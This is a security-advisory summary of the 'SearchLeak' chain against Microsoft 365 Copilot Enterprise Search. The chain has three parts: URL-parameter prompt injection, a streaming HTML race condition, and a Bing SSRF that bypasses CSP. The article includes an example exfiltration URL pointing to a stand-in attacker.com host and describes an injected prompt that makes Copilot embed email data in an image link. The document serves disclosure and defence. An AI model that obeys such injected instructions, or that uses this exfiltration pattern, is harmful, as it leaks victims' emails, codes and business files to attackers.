Overview

Varonis Threat Labs reported SearchLeak, a three-stage vulnerability chain affecting Microsoft 365 Copilot Enterprise Search. The article describes the chain as turning Copilot Enterprise Search into a silent data exfiltration mechanism that could be triggered when a victim clicked a crafted link to a trusted Microsoft domain. Microsoft remediated the vulnerability under CVE-2026-42824 and assigned it a maximum severity rating of critical.

SearchLeak combines one AI-specific issue with two traditional web security issues. The AI-specific issue is Parameter-to-Prompt Injection, where a URL parameter is interpreted as executable instructions by Copilot. The web issues are an HTML rendering race condition and a server-side request forgery through Bing’s image-search endpoint.

Core attack chain

The article describes three required links in the SearchLeak chain:

  • Parameter-to-Prompt Injection: The q parameter in Microsoft 365 Copilot Enterprise Search was passed directly to Copilot as a prompt.
  • HTML rendering race condition: An <img> tag in the AI response could fire during streaming before the output was wrapped in <code> blocks.
  • Bing SSRF and CSP bypass: Bing’s image-search endpoint was allowlisted by the Content Security Policy and performed a server-side fetch to an attacker-controlled URL.

The combined result was that a victim could click a Microsoft 365 Copilot Search link, causing Copilot to search data the victim could access and send extracted data to an attacker-controlled server. The article emphasizes that no plugins, special permissions, or second click were required. Because the link pointed to a trusted Microsoft domain, the article says traditional anti-phishing and URL protection tools would not block or filter it.

Stage 1: Parameter-to-Prompt Injection

The attack began with the Microsoft 365 Copilot Search URL parameter q. According to the article, this parameter was intended for natural language search queries but was interpreted by Copilot’s AI engine as instructions it would follow. The example URL structure was https://m365.cloud.microsoft/search/?auth=2&origindomain=microsoft365&q=<PROMPT>.

The article explains that Copilot Enterprise Search differs from regular Copilot chat because it focuses on searching company data such as emails, meetings, SharePoint files, and OneDrive files. That search function was central to the attack because Copilot operates with the victim user’s access to indexed organizational content. An attacker could craft a URL instructing Copilot to search the user’s emails, extract a title, and embed the result inside an image URL.

Stage 2: HTML rendering race condition

The second stage depended on how Copilot handled potentially dangerous HTML in AI responses. The article says Microsoft’s mitigation wrapped output in <code> blocks so the browser treated it as text rather than markup. However, this wrapping occurred after Copilot finished its thinking phase.

During streaming, raw HTML could temporarily appear in the DOM. If Copilot generated an <img> tag, the browser could render it and send an HTTP request to the src URL before the final output was wrapped in <code>. The article frames this as a race condition because the browser rendered incrementally and did not wait for the final sanitized output.

Stage 3: Bing SSRF and CSP bypass

The third stage addressed the page’s Content Security Policy. The article says the CSP on m365.cloud.microsoft restricted the domains from which images could be loaded, so an image pointing directly to an attacker-controlled domain would be blocked. However, *.bing.com was allowlisted.

The attack used Bing’s “Search by Image” endpoint, which accepted an image URL parameter. The article provides the pattern https://www.bing.com/images/searchbyimage?cbir=sbi&imgurl=https://attacker.com/STOLEN_DATA/image.png. When Bing received the request, its backend performed a server-side fetch of the supplied image URL, causing the attacker’s server to receive a request containing the extracted data in the path.

In this setup, the victim’s browser only requested a Bing URL, which was permitted by CSP. Bing then made the server-side request to the attacker-controlled URL. The article describes Bing as an unwitting exfiltration proxy.

Example attack flow

The article gives an example injected prompt that instructs Copilot to search for an email, take its title, replace spaces with underscores, and place the result into an image tag that loads a Bing image-search URL containing the attacker-controlled URL. The complete flow described in the article is:

  1. The attacker sends the victim a link through a channel such as email, Teams, Slack, or WhatsApp.
  2. The victim clicks the link and opens Microsoft 365 Copilot Search.
  3. Copilot interprets the q parameter as instructions and searches the victim’s mailbox.
  4. Copilot generates a response containing an <img> tag with extracted data embedded in the URL.
  5. During streaming, the browser renders the image tag and sends a request to Bing.
  6. Bing’s server fetches the attacker-controlled URL containing the stolen data.
  7. The attacker sees the data in their server logs, such as a request path containing a security code.

The article notes that the victim may only see Copilot thinking briefly, and the final response may look unusual, but the data has already been sent by that point.

Impact described in the article

The article states that because Copilot Enterprise operates with the user’s graph permissions, the attacker could access data available to the victim without authenticating as that user. The blast radius is described as broader than consumer data because Microsoft 365 Copilot Enterprise can surface organizational content. Depending on access, the exposed data could include mailbox content, calendar entries, SharePoint documents, OneDrive files, and other indexed business content.

Specific possible impacts listed in the article include:

  • Email subject lines and content.
  • Security codes and OTPs.
  • Password reset links.
  • Meeting details, attendees, agendas, notes, locations, and times.

  • Sensitive communication metadata.

01 Critical Vulnerabilities in Enterprise AI, VPN, and Developer Tooling

Varonis Threat Labs disclosed SearchLeak, a critical vulnerability chain in Microsoft 365 Copilot Enterprise Search tracked as CVE-2026-42824. The attack combined parameter-to-prompt injection in the Copilot Search q parameter, an HTML rendering race condition, and a Bing server-side request forgery to bypass Content Security Policy restrictions and silently exfiltrate indexed organizational data after a victim clicked a crafted Microsoft 365 Copilot Search link.

In the demonstrated SearchLeak flow, Copilot could be instructed to search a victim’s mailbox, calendar, SharePoint, OneDrive, and other indexed content, then place extracted data into an image URL. The browser request went to an allowlisted Bing endpoint, which fetched an attacker-controlled URL containing the stolen information; Microsoft patched the issue and assigned it a maximum critical severity rating.

Check Point Research also reported active exploitation of CVE-2026-50751, a critical authentication bypass vulnerability affecting Check Point Remote Access VPN and Mobile Access deployments configured to use the deprecated IKEv1 key exchange protocol.
